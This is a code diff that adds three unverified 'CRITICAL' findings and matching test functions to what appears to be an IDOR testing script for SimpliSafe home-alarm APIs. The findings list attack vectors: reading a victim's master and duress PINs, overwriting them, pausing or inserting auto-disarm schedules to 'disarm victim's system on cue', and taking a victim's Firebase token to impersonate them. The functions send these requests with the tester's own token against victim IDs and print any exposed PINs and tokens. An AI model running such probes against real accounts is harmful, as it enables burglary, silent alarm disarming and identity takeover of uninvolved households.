@@ -184,6 +184,41 @@ FINDINGS = [
                   'POST monitoring/v1/locations/validations/safeword (oracle); '
                   'All 401 without token — IDOR pending auth test. '
                   'If locationId not cross-validated: alarm history read, permit manipulation, alarm dismiss.'),
+    Finding("F27", "CRITICAL", "Alarm PIN Read/Write IDOR via SID",
+            "yoda", "/subscriptions/{sid}/pins", "GET+POST", None,
+            verified=False,
+            notes='APK: SimpliSafeRestService.java classes14.dex. '
+                  'GET /v1/subscriptions/{sid}/pins?cached=false -> PinGroup{masterPin, customPin1-4, duressPin, lastUpdated}. '
+                  'POST /v1/subscriptions/{sid}/pins -> overwrite all alarm PINs. '
+                  'PinGroup returned in plaintext. duressPin = panic/coercion PIN (cancels dispatch). '
+                  'If sid not validated against JWT sub: attacker reads all victim alarm PINs OR sets them to known values. '
+                  'Impact: silent disarm (own PIN), frame-up (change to victim\'s PIN after burglary). '
+                  'Test: GET /v1/subscriptions/{victim_sid}/pins?cached=false with own token; 200 = CRITICAL.'),
+    Finding("F28", "CRITICAL", "Scheduled Arm/Disarm Manipulation IDOR via locationId",
+            "app_hub", "/v1/scheduledEvents/locations/{locationId}", "GET+PUT", None,
+            verified=False,
+            notes='Swagger: GET/PUT /v1/scheduledEvents/locations/{locationId}. '
+                  'APK: ScheduledEventsRepositoryImpl.java classes12.dex (pauseScheduledEvents, createScheduledEvent). '
+                  'ReminderRequestBody{crontab, deviceId, deviceType, options{paused, desiredState}, type, sid}. '
+                  'desiredState: OFF|HOME|AWAY. type: ARMING|SCHEDULED_EVENT. '
+                  'If locationId not JWT-bound: attacker reads/modifies/deletes victim\'s automated arm schedule. '
+                  'Vectors: (1) Read schedule -> know when victim is home/away. '
+                  '(2) Pause all auto-arm schedules (options.paused=true) -> system never auto-arms. '
+                  '(3) Insert auto-disarm at chosen time -> disarm victim\'s system on cue. '
+                  'Silent: no push notification sent for schedule changes. '
+                  'Test: GET /v1/scheduledEvents/locations/{victim_locationId} with own token; 200 = CRITICAL.'),
+    Finding("F29", "CRITICAL", "Firebase Custom Token IDOR — Firestore Preference Takeover",
+            "app_hub", "/v1/users/{uid}/firebaseCredentials", "GET", None,
+            verified=False,
+            notes='APK: SsAppHubRestService.java classes14.dex. '
+                  'GET /v1/users/{uid}/firebaseCredentials -> FirebaseCredentialsResponse{customToken}. '
+                  'customToken = Firebase custom token signed by SimpliSafe service account. '
+                  'App uses FirebaseFirestore collection USER_COLLECTION/{userId}/LOCATION_COLLECTION for preferences. '
+                  'Impact: signInWithCustomToken(victim_token) -> authenticate to Firebase AS victim -> '
+                  'read/write victim\'s Firestore preferences including currentLocationId and location settings. '
+                  'If uid not validated against JWT sub: full Firebase identity takeover for victim. '
+                  'Test: GET /v1/users/{victim_uid}/firebaseCredentials with own token; '
+                  '200+token -> attempt signInWithCustomToken -> Firestore read = CRITICAL.'),
 ]
 
 
@@ -452,6 +487,61 @@ def test_monitoring_idor(token, victim_location_id):
         if r:
             sev = "CRIT" if r.status_code == 200 else "INFO"
             _print(sev, r.status_code, f"{label}  {r.text[:100]}")
+
+
+def test_alarm_pin_idor(token, victim_sid):
+    """F27: Read all alarm PINs for victim SID (master, custom, duress)."""
+    print(f"\n=== F27 — Alarm PIN IDOR (victim_sid={victim_sid}) ===")
+    r = get(f"{SERVICES['yoda']}/subscriptions/{victim_sid}/pins?cached=false", token=token)
+    if not r:
+        print("  Request failed"); return
+    if r.status_code == 200:
+        try:
+            d = r.json()
+            pins = d.get("pins", d)
+            master = pins.get("masterPin") or pins.get("master", {}).get("pin")
+            duress = pins.get("duressPin") or pins.get("duress", {}).get("pin")
+            customs = [v for k, v in pins.items() if "custom" in k.lower()]
+            _print("CRIT", 200,
+                   f"PINS EXPOSED sid={victim_sid} master={master} duress={duress} custom={customs}")
+        except Exception as e:
+            _print("CRIT", 200, f"200 OK (parse error: {e}) raw={r.text[:200]}")
+    else:
+        _print("INFO", r.status_code, f"pins/{victim_sid}: {r.text[:100]}")
+
+
+def test_scheduled_arm_idor(token, victim_location_id):
+    """F28: Read/modify victim's automated arm/disarm schedule."""
+    print(f"\n=== F28 — Scheduled Arm IDOR (victim_location_id={victim_location_id}) ===")
+    base = SERVICES["app_hub"]
+    r = get(f"{base}/v1/scheduledEvents/locations/{victim_location_id}", token=token)
+    if not r:
+        print("  Request failed"); return
+    if r.status_code == 200:
+        _print("CRIT", 200, f"SCHEDULE READ locationId={victim_location_id}: {r.text[:200]}")
+    else:
+        _print("INFO", r.status_code, f"scheduledEvents/{victim_location_id}: {r.text[:100]}")
+
+
+def test_firebase_token_idor(token, victim_uid):
+    """F29: Obtain victim's Firebase custom token (Firestore identity takeover)."""
+    print(f"\n=== F29 — Firebase Token IDOR (victim_uid={victim_uid}) ===")
+    r = get(f"{SERVICES['app_hub']}/v1/users/{victim_uid}/firebaseCredentials", token=token)
+    if not r:
+        print("  Request failed"); return
+    if r.status_code == 200:
+        try:
+            d = r.json()
+            custom_token = d.get("customToken") or d.get("token")
+            if custom_token:
+                _print("CRIT", 200,
+                       f"FIREBASE TOKEN OBTAINED uid={victim_uid} token={custom_token[:40]}...")
+            else:
+                _print("CRIT", 200, f"200 OK raw={r.text[:200]}")
+        except Exception as e:
+            _print("CRIT", 200, f"200 OK (parse err: {e}) raw={r.text[:200]}")
+    else:
+        _print("INFO", r.status_code, f"firebaseCredentials/{victim_uid}: {r.text[:100]}")
 
 
 # ─── IDOR Test Suite ────────────────────────────────────────────────────────────
